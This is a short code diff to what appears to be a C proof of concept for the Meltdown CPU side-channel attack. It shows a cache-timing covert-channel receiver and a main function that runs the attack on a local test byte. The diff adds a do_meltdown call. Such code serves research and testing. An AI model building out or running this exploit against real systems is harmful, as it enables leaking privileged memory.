@@ -91,7 +91,6 @@ static void cc_transmit(uint8_t value) {
 static int cc_receive() {
     u64 time;
     void *cur_adrs;
-    int ret=-1;
     for (int i=0; i< (int)cc_buf_size/4096;i++){
         asm volatile("mfence\n");
         cur_adrs=&cc_buffer[i*512+i];
@@ -155,6 +154,8 @@ int main(){
     uint8_t test_num = 8;
     meltdown((uintptr_t) &test_num);
     printf("%i\n", cc_receive());
+    
+    printf("%i\n", do_meltdown(&test_num));
     munmap(cc_buffer, cc_buf_size);
     return 0;
 }
